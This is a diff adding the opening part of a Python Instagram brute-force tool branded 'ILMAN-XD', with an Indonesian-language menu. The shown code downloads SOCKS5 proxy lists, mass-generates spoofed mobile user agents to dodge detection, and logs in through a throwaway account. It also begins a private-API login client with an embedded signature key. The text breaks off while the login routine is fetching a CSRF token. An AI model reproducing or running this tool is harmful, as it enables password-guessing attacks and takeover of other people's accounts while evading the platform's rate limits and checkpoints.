+from rich.console import Console as sol
+from rich.panel import Panel as nel
+from rich import print as cetak
+from time import sleep
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
+import time
+from rich.progress import track
+from rich.tree import Tree
+from rich import print as prints
+from rich import print as rprint
+from rich.table import Table as me
 
-#Encryption codes have almost 300 lines above.So Compress the encryption codes using Zlib.
+###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
+from rich.panel import Panel
+from rich.tree import Tree
+from rich import print as prints
+from rich.console import Console
+from rich.table import Table
+from rich.columns import Columns
+console = Console()
+from concurrent.futures import ThreadPoolExecutor as Modol
+from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
+
+day=datetime.now().strftime("%d-%b-%Y")
+nyMnD = 5
+nyMxD = 10
+current_GMT = time.gmtime(time.time())
+insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
+url='https://z-p42.www.instagram.com/'
+menudump=[]
+prox_ilman=[]
+
+CY='\033[96;1m'
+H='\33[32;1m' #HIJAU
+M='\033[1;31m' #MERAH
+K='\033[1;33m' #KUNING
+U='\033[1;35m' #UNGU
+O='\033[38;2;255;127;0;1m' #ORANGE
+C='\033[0m' #CLEAR
+N = '\x1b[0m' # WARNA MATI
+Z2 = "[#000000]" # HITAM
+M2 = "[#FF0000]" # MERAH
+H2 = "[#00FF00]" # HIJAU
+K2 = "[#FFFF00]" # KUNING
+B2 = "[#00C8FF]" # BIRU
+U2 = "[#AF00FF]" # UNGU
+N2 = "[#FF00FF]" # PINK
+O2 = "[#00FFFF]" # BIRU MUDA
+P2 = "[#FFFFFF]" # PUTIH
+J2 = "[#FF8F00]" # JINGGA
+A2 = "[#AAAAAA]" # ABU-ABU
+#WARNA rick(kotak)
+HH = "[#000000]" # Hitam
+MM = "[#FF0000]" # Merah
+II = "[#00FF00]" # Hijau
+KK = "[#FFFF00]" # Kuning
+BB = "[#00C8FF]" # Biru
+UU = "[#AF00FF]" # Ungu
+PP = "[#FF00FF]" # Pink
+CC = "[#00FFFF]" # Biru Muda
+QQ = "[#FFFFFF]" # Putih
+JJ = "[#FF8F00]" # Jingga
+AA = "[#AAAAAA]" # Abu-Abu
+OO = "[#FFA500]" # OREN
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+
+try:
+	color_rich = open("data/color_rich.txt","r").read()
+except FileNotFoundError:
+	color_rich = "[#afafff]"
+try:
+	color_table = open("data/color_table.txt","r").read()
+except FileNotFoundError:
+	color_table = "#afafff"
+
+def change_theme():
+	prints(Panel(f"""{P2}[{color_rich}01{P2}]. change theme color red    [{color_rich}06{P2}]. change theme color pink
+[{color_rich}02{P2}]. change theme color green  [{color_rich}07{P2}]. change theme color L blue
+[{color_rich}03{P2}]. change theme color yellow [{color_rich}08{P2}]. change theme color white
+[{color_rich}04{P2}]. change theme color blue   [{color_rich}09{P2}]. change theme color orange
+[{color_rich}05{P2}]. change theme color violet [{color_rich}10{P2}]. change theme color gray""",width=80,padding=(0,4),style=f"{color_table}"))
+	them = input(f" {N}choose theme : ")
+	if them in["1","01"]:
+		open("data/color_rich.txt","w").write("[#FF0000]")
+		open("data/color_table.txt","w").write("#FF0000")
+	elif them in["2","02"]:
+		open("data/color_rich.txt","w").write("[#00FF00]")
+		open("data/color_table.txt","w").write("#00FF00")
+	elif them in["3","03"]:
+		open("data/color_rich.txt","w").write("[#FFFF00]")
+		open("data/color_table.txt","w").write("#FFFF00")
+	elif them in["4","04"]:
+		open("data/color_rich.txt","w").write("[#00C8FF]")
+		open("data/color_table.txt","w").write("#00C8FF")
+	elif them in["5","05"]:
+		open("data/color_rich.txt","w").write("[#AF00FF]")
+		open("data/color_table.txt","w").write("#AF00FF")
+	elif them in["6","06"]:
+		open("data/color_rich.txt","w").write("[#FF00FF]")
+		open("data/color_table.txt","w").write("#FF00FF")
+	elif them in["7","07"]:
+		open("data/color_rich.txt","w").write("[#00FFFF]")
+		open("data/color_table.txt","w").write("#00FFFF")
+	elif them in["8","08"]:
+		open("data/color_rich.txt","w").write("[#FFFFFF]")
+		open("data/color_table.txt","w").write("#FFFFFF")
+	elif them in["9","09"]:
+		open("data/color_rich.txt","w").write("[#FF8F00]")
+		open("data/color_table.txt","w").write("#FF8F00")
+	elif them in["10"]:
+		open("data/color_rich.txt","w").write("[#AAAAAA]")
+		open("data/color_table.txt","w").write("#AAAAAA")
+	time.sleep(2)
+	prints(Panel("[white]berhasil mengganti tema, silahkan jalankan ulang scriptnya python run.py",style=f"{color_table}"));time.sleep(2);exit()
+
+USN="Mozilla/5.0 (Linux; Android 6.0; MEIZU_M5 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (23/6.0; 320dpi ; 720x1280; Meizu; MEIZU_M5; MEIZU_M5; mt6755; ru_RU; 105842051)"
+USN="Mozilla/5.0 (Linux; Android 6.0; M5 Note Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/44.0.2403.128 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1920; Meizu; Catatan M5; M5Catatan; mt6755; ru_RU; 98288242)"
+
+internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
+method=[]
+s=requests.Session()
+uaxz=[]
+xxkontol=[]
+axz=[]
+oppo=[]
+for tu in range(1000):
+            a = random.choice([
+            'CPH1853',
+            'CPH1803',
+            'CPH1893',
+            'CPH2071',
+            'CPH1717',
+            'CPH1937',
+            'CPH1923',
+            'CPH1725',
+            'CPH1909',
+            'CPH1613',
+            'CPH1989',
+            'CPH1907',
+            'CPH2015',
+            'CPH2083'])
+            b = random.randrange(73, 99)
+            c = random.randrange(4200, 4900)
+            d = random.randrange(40, 150)
+            e = random.choice([
+            'my-zg',
+            'en-us',
+            'en-gb',
+            'en-au',
+            'th-th',
+            'hi-in',
+            'zh-tw',
+            'in-id',
+            'ru-ru',
+            'vi-vn',
+            'zh-cn'])
+            f = random.choice([
+            '9',
+            '10',
+            '11',
+            '12',
+            '5.1',
+            '4.4.4',
+            '8.1.0',
+            '7.1.1',
+            '6.0.1',
+            '5.1.1'])
+            g = random.randrange(4,99)
+            h = random.randrange(3,10)
+            i = random.randrange(111111,199999)
+            j = random.randrange(1,9)
+            ugens_ilman = f'Mozilla/5.0 (Linux; U; Android {f}; {e}; {a} Build/N2G47H {i}.0{j}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36 OppoBrowser/{g}.{h}.1.{h}'
+            oppo.append(ugens_ilman)
+try:
+    proxs_ilman = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all").text
+    for ilman_team in proxs_ilman.splitlines():prox_ilman.append(ilman_team)
+except:prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));exit()
+
+def waktu():
+	now = datetime.now()
+	hours = now.hour
+	if 4 <= hours < 12:timenow = "selamat pagi"
+	elif 12 <= hours < 15:timenow = "selamat siang"
+	elif 15 <= hours < 18:timenow = "selamat sore"
+	else:timenow = "selamat malam"
+	return timenow
+
+def jalan(keliling):
+	for mau in keliling + '\n':
+		sys.stdout.write(mau)
+		sys.stdout.flush();sleep(0.03)
+		
+warnaa = random.choice([M,H,K,U,O])
+kontolwarna = random.choice([M,H,K,U,O])
+wr = random.choice([M,K,H,U,O])
+kontol_rich = random.choice([K2,M2,H2,U2,B2,O2,J2])
+
+# BANNER
+def banner():
+	os.system("clear")
+	prints(Panel(f"{P2}\tSELAMAT DATANG DI TOLS {color_rich}'ILMAN-XD'{P2} MULTI BRUTE FORCE IG",width=80,padding=(0,4),style=f"{color_table}"))
+	prints(Panel(f'''{O2}               "SC FREE RASA PREMIUM | ILMAN-XD Nih Boss"{color_rich}
+╭──────────────────────────────────────────────╮{H2}•{P2} Author : ILMAN-XD {color_rich}
+│1010101011101001010110101010110010010101010100│
+│01██╗██╗10110███╗100███╗10█████╗10███╗100██╗00│{H2}•{P2} Author2: 8D{color_rich}
+│10██║██║10001████╗█████║0██╔══██╗1████╗01██║10│
+│10██║██║01010██╔████ ██║0███████║0██╔██╗0██║11│{H2}•{P2} Status : {H2}Premium{color_rich}
+│01██║██║10010██║ ██╔╝██║1██╔══██║0██║╚██1██║00│
+│11██║███████╗██║10010██║1██║10██║1██║1╚████║01│{H2}•{P2} Team   : I'm The Solo{color_rich}
+│00╚═╝╚══════╝╚═╝01011╚═╝0╚═╝01╚═╝0╚═╝10╚═══╝10│
+╰──────────────────────────────────────────────╯{H2}•{P2} Version: 1.0 ''',width=80,padding=(0,2),style=f"{color_table}"))
+
+def process_data():
+    sleep(0.08)
+    	
+try:
+    # python 2
+	urllib_quote_plus = urllib.quote
+except:
+    # python 3
+	urllib_quote_plus = urllib.parse.quote_plus
+ 
+
+def cekAPI(cookie):
+    user=open('data/.username','r').read()
+    try:
+        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
+        i=c.json()["data"]["user"]
+        nama=i["full_name"]
+        followers=i["edge_followed_by"]["count"]
+        following=i["edge_follow"]["count"]
+        external.append(f'{nama}|{followers}|{following}')
+    except  (ValueError,KeyError):
+        prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"{color_table}"));os.system('rm -rf data/.kukis.log rm -rf data/.username');exit()
+
+    return external,user
+
+def login_kamu():
+    if "sukses" in lisensiku:
+        try:
+            kuki=open('data/.kukis.log','r').read()
+        except FileNotFoundError:
+            banner()
+            prints(Panel(f"{P2}disarankan login menggunakan cookie agar terhindar dari checkpoint akun",width=80,padding=(0,2),style=f"{color_table}"))
+            prints(Panel(f"{P2}[{color_rich}1{P2}]. login menggunakan cookie ( {H2}disarankan{P2} )\n{P2}[{color_rich}2{P2}]. login menggunakan username & password\n{P2}[{color_rich}3{P2}]. keluar ( {M2}tools {P2})",width=80,padding=(0,4),style=f"{color_table}"))
+            loginpil=input(f"input 1 sampai 3 : ")
+            if loginpil=='':prints(Panel(f"{P2}jangan kosong broo!!! pilih salah satu yang di atas",width=80,padding=(0,4),style=f"{color_table}"));exit()
+            if loginpil=='1':
+                prints(Panel(f"{P2}sebelum login pastikan akun tumbal bersifat publik dan bukan private",width=80,padding=(0,4),style=f"{color_table}"))
+                us=input(f'masukan username : ')
+                cok=input(f'masukan cookie   : ')
+                for _ in track(range(100), description=f'{P2}tunggu sedang login...'):process_data()
+                kuki=open('data/.kukis.log','w').write(cok)
+                user=open('data/.username','w').write(us)
+                prints(Panel(f"{P2}login akun tumbal berhasil, silahkan jalankan ulang scriptnya",width=80,padding=(0,7),style=f"{color_table}"));exit()
+            elif loginpil == '2':
+                login()
+            elif loginpil == '3':
+                prints(Panel(f"{P2}terima kasih telah menggunakan script {color_rich}'InstaXC'{P2} semoga hari² kamu menyenangkan",width=80,padding=(0,3),style=f"{color_table}"));time.sleep(2);exit()
+        ex,user=cekAPI(kuki)
+        cookie={'cookie':kuki}
+        instagram(ex,user,cookie).menu()
+    else:
+        lisensi()
+def login():
+	global external
+	try:
+		prints(Panel(f"{P2}sebelum login pastikan akun tumbal bersifat publik dan bukan private",width=80,padding=(0,4),style=f"{color_table}"))
+		us=input(f' masukan username : ')
+		pw=input(f' masukan password : ')
+	except KeyboardInterrupt:
+		print(f' keyboardinterrupt terdeteksi... keluar !')
+		exit()
+	x=instagramAPI(us,pw).loginAPI()
+	if x.get('status')=='success':
+		open('data/.username','a').write(us)
+		open('data/.kukis.log','a').write(x.get('cookie'))
+		cookie={'cookie':x.get('cookie')}
+		prints(Panel(f"{P2}login akun tumbal berhasil, silahkan jalankan ulang scriptnya",width=80,padding=(0,7),style=f"{color_table}"));exit()
+	elif x.get('status')=='checkpoint':
+		prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"{color_table}"));os.system("rm -rf data/.kukis.log rm -rf data/.username");exit()
+	else:
+		prints(Panel(f"{P2}username atau password yang anda masukan salah silahkan cek dan coba lagi",width=80,padding=(0,1),style=f"{color_table}"))
+		time.sleep(2);exit()
+
+def User_Agent():
+	dpi_phone = [
+		'133','320','515','160','640','240','120'
+		'800','480','225','768','216','1024']
+	model_phone = [
+		'Nokia 2.4','HUAWEI','Galaxy',
+		'Unlocked Smartphones','Nexus 6P',
+		'Mobile Phones','Xiaomi',
+		'samsung','OnePlus']
+	pxl_phone = [
+		'623x1280','700x1245','800x1280',
+		'1080x2340','1320x2400','1242x2688']
+	i_version = [
+		'114.0.0.20.2','114.0.0.38.120',
+		'114.0.0.20.70','114.0.0.28.120',
+		'114.0.0.0.24','114.0.0.0.41']
+	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
+	return User_Agent
+
+def user_agent():
+	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
+	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
+	dpis = ['120', '160', '320', '240']
+	ver = random.choice(versions)
+	dpi = random.choice(dpis)
+	res = random.choice(resolutions)
+	return (
+		'Instagram 4.{}.{} '
+		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
+	).format(
+		random.randint(1, 2),
+		random.randint(0, 2),
+		random.randint(10, 11),
+		random.randint(1, 3),
+		random.randint(3, 5),
+		random.randint(0, 5),
+		dpi,
+		res,
+		ver,
+		ver,
+	)
+
+def user_agentAPI():
+	APP_VERSION = "136.0.0.34.124"
+	VERSION_CODE = "208061712"
+	DEVICES = {
+		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
+		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
+		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
+		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
+		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
+		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
+		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
+		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
+		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
+	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
+	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
+	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
+	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
+	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
+	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
+	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
+	device = DEVICES[DEFAULT_DEVICE]['device']
+	model = DEVICES[DEFAULT_DEVICE]['model']
+	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
+	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
+	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
+	return USER_AGENT_BASE
+
+class instagramAPI:
+	API_URL = 'https://z-p42.www.instagram.com/api/v1/'
+	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
+		'model': 'HM 1SW',
+		'android_version': 18,
+		'android_release': '4.3'}
+	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
+	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
+	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
+	SIG_KEY_VERSION = '4'
+
+	def __init__(self,username,password):
+		self.username=username
+		self.password=password
+		m = hashlib.md5()
+		m.update(username.encode('utf-8') + password.encode('utf-8'))
+		self.device_id = self.generateDeviceId(m.hexdigest())
+		self.uuid = self.generateUUID(True)
+		self.s = requests.Session()
+
+	def generateDeviceId(self, seed):
+		volatile_seed = "12345"
+		m = hashlib.md5()
+		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
+		return 'android-' + m.hexdigest()[:16]
+
+	def generateUUID(self, type):
+		generated_uuid = str(uuid.uuid4())
+		if (type):
+			return generated_uuid
+		else:
+			return generated_uuid.replace('-', '')
+
+	def loginAPI(self):
+		token=self.s.get("https://z-p42.www.instagram.com/",headers={"user-agent":User_Agent()}).text
+		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
